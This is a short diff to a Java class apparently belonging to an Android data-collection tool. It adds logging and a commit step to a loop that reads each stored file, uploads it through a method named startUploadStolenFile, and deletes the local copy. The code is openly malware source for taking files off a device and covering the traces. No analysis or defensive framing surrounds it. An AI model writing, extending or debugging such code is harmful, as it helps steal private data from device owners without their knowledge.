@@ -34,6 +34,9 @@ public class CollectorMain extends ContextWrapper implements Runnable
 			try {
 				if (w != null)w.close();
 			} catch (IOException e) {}
+			try {
+				sb.commitChanges();
+			} catch (IOException e) {}
 			System.out.println(s);
 		}
 		String[] files;
@@ -43,10 +46,12 @@ public class CollectorMain extends ContextWrapper implements Runnable
 			return;
 		}
 		for(String filename:files){
+			System.out.println(filename);
 			try {
 				copyAndClose(sb.readFile(filename), fu.startUploadStolenFile(filename));
 				sb.deleteFile(filename);
 			} catch (Throwable e) {
+				e.printStackTrace();
 				continue;
 			}
 		}
